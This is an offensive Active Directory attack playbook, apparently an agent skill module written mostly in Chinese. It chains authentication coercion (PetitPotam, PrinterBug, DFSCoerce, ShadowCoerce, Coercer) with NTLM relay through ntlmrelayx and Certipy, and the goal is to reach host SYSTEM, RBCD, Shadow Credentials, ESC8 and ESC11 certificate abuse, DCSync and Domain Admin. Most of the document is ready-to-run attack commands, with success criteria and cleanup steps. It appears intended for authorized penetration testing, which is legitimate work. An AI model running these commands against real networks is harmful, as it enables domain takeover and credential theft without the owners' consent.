# Authentication Coercion + NTLM Relay — AD Attack Chain

> AD authentication attack chain。不再依赖 `/creds` 保存完整流程。`/creds` 以后只处理捕获到的 NetNTLM/hash 的识别、破解、复用。
>
> 本链的目标是 **host execution / RBCD / Shadow Credentials / 证书身份 / DA**。不要停在“coercion 扫到一个接口”。

```text
Coercion / inbound NTLM
          ↓
Relay prerequisite gate（signing / CBT / EPA）
          ↓
SMB / LDAP(S) / HTTP ADCS / RPC ICPR
          ↓
host SYSTEM / RBCD / Shadow Cred / ESC8 / ESC11
          ↓
继续当前 AD 链直到 DA / 目标身份
```

---

## 1. Relay viability

### SMB signing

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay-smb.txt
cat relay-smb.txt
nmap -Pn -p445 --script smb2-security-mode.nse TARGET
```

SMB signing required 的目标 **不是** 普通 SMB relay sink。

### LDAP signing / channel binding

Windows Server 2025 **新建 AD** 默认 LDAP signing；升级环境可能保留旧策略。不要用 OS 年份静态判断。

```text
LDAP signing required?
LDAPS channel binding required?
relay source 是否要求 SIGN/SEAL?
AD CS Web Enrollment EPA?
ICPR IF_ENFORCEENCRYPTICERTREQUEST?
```

Impacket LDAP relay 在客户端要求 signing 时会明确失败。失败就换 LDAPS/其他 sink，不要死磕。

---

## 2. Coercion family

Coercion 成功 ≠ relay 成功。下一步仍看 sink 的 signing/CBT/EPA/权限。

### Coercer — 先扫可用接口

```bash
pipx install coercer
Coercer scan -t DC01.corp.com -u jen -p 'pass' -d corp.com
Coercer coerce -t DC01.corp.com -l 10.10.14.20 -u jen -p 'pass' -d corp.com
```

覆盖多种 MS-RPC coercion。记下哪个 method 在目标上真实可用。

### PetitPotam — MS-EFSRPC

```bash
git clone https://github.com/topotam/PetitPotam.git
# 无凭据（未打补丁的 EFSRPC）
python3 PetitPotam.py 10.10.14.20 DC01.corp.com
# 有凭据
python3 PetitPotam.py -u jen -p 'pass' -d corp.com 10.10.14.20 DC01.corp.com
```

### PrinterBug / SpoolSample — MS-RPRN

```bash
# Python（Kali）
python3 printerbug.py corp.com/jen:pass@DC01.corp.com 10.10.14.20

# Windows
SpoolSample.exe DC01.corp.com 10.10.14.20
```

Print Spooler 未运行或被补丁限制时换其他 method。

### DFSCoerce — MS-DFSNM

```bash
git clone https://github.com/Wh04m1001/DFSCoerce.git
python3 dfscoerce.py -u jen -p 'pass' -d corp.com 10.10.14.20 DC01.corp.com
```

### ShadowCoerce — MS-FSRVP

File Server Remote VSS Protocol。从旧 `/edr-bypass` 迁回 AD。

```bash
git clone https://github.com/ShutdownRepo/ShadowCoerce.git
python3 shadowcoerce.py -u jen -p 'pass' -d corp.com 10.10.14.20 DC01.corp.com
```

目标需跑 File Server VSS。接口常见：`IsPathSupported` / `IsPathShadowCopied`。

---

## 3. Generic SMB relay → host execution

```bash
impacket-ntlmrelayx -tf relay-smb.txt -smb2support -c 'whoami'
# 或直接弹 SYSTEM shell（授权靶场）
impacket-ntlmrelayx -tf relay-smb.txt -smb2support -i
# 交互后：
# 可 secretsdump / 写文件 / 执行
```

触发：对 signing 未强制的目标跑上面任意 coercion。

成功：

```text
Authenticating against smb://TARGET as DOMAIN/USER SUCCEED
+ whoami / 命令输出
```

relayed 身份不是 local admin 时，认证成功 ≠ host execution。记真实权限，改 LDAP sink。

拿到 SYSTEM 后本 AD 链可以继续：dump、横向、DCSync（若已是 DA 等价）。不要因为出现 shell 就强制切 `/shell`。

---

## 4. LDAP relay → RBCD

条件：relayed 身份对目标计算机有足够 LDAP 写权限，且 LDAP relay 可行。

```bash
impacket-ntlmrelayx -t ldap://DC-IP -smb2support \
  --delegate-access --escalate-user 'FAKE$'
```

检查 `msDS-AllowedToActOnBehalfOfOtherIdentity`，再按 `kerberos-attacks.md` 走 S4U 拿服务票、远程执行。

清理：删掉添加的 RBCD ACE。

---

## 5. LDAP relay → Shadow Credentials

Impacket 2026 支持 `--shadow-credentials`（KeyCreds 有 2026 适配）。

```bash
impacket-ntlmrelayx -t ldap://DC-IP -smb2support \
  --shadow-credentials --shadow-target 'TARGET$' \
  --cert-outfile-path target-shadow.pfx
```

条件：对 `TARGET$` 的 `msDS-KeyCredentialLink` 有写权限。

成功：KeyCredential 写入 + PFX 落地。随后 PKINIT 拿 TGT，继续 AD 横向。

清理：删除新增 KeyCredential。

---

## 6. HTTP relay → AD CS ESC8

模板/证书细节以 `adcs.md` 为准。

```bash
impacket-ntlmrelayx \
  -t http://CA/certsrv/certfnsh.asp \
  --adcs --template DomainController --smb2support

# 或 Certipy
certipy relay -target 'http://CA/certsrv/certfnsh.asp' -template DomainController
```

EPA 开启时 HTTP ESC8 会失败。换 ESC11 或其他链，不要把 EPA 当成 EDR。

成功：PFX → `certipy auth` → DC hash / TGT → DCSync。这是完整 AD 链，打到 DA。

---

## 7. RPC relay → ESC11（ICPR）

条件：CA **未** 设置 `IF_ENFORCEENCRYPTICERTREQUEST`，ICPR 接受未加密 NTLM。

枚举（Certipy 会标 ESC11）：

```bash
certipy find -u jen@corp.com -p 'pass' -dc-ip DC-IP -vulnerable
# 找：Encryption is not enforced for ICPR / ESC11
```

Certipy：

```bash
certipy relay -target "rpc://CA-IP" -ca "CORP-CA" -template DomainController
```

Impacket：

```bash
impacket-ntlmrelayx -t rpc://CA-IP -rpc-mode ICPR \
  -icpr-ca-name CORP-CA -smb2support
```

然后 coercion 强制 **DC 机器账户** 来认证。成功后同样 `certipy auth` + DCSync。

ESC11 是 AD relay sink，写在本文件；证书细节补充见 `adcs.md`。

---

## 8. CVE-2025-33073 SIGN/SEAL 移除

只有 `/ad-recon` 确认目标 build/patch 是候选时：

```bash
impacket-ntlmrelayx ... --remove-sign-seal
```

**不是** 默认参数。乱加会在已打补丁目标上直接失败并留特征。

---

## 9. 2026 Impacket 备注

当前 `ntlmrelayx` 相关能力：

```text
Shadow Credentials relay
WinRM relay 修复
MSSQL/RDP relay-server
ICPR/RPC
CVE-2025-33073 --remove-sign-seal
```

以你安装的 Impacket `-h` 为准。

---

## 10. Cleanup

```text
RBCD         恢复/删除 msDS-AllowedToActOnBehalfOfOtherIdentity
Shadow Cred  删除新增 msDS-KeyCredentialLink
AD CS        记录 serial/template；按授权撤销证书
机器账户     测试用 FAKE$ 用完删除
Relay 本身   不改 AD 对象；要清的是 sink 写入
```

### Primary references

- https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
- https://github.com/p0dalirius/Coercer
- https://github.com/topotam/PetitPotam
- https://github.com/Wh04m1001/DFSCoerce
- https://github.com/ShutdownRepo/ShadowCoerce
- https://github.com/leechristensen/SpoolSample
- https://github.com/ly4k/Certipy
- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing
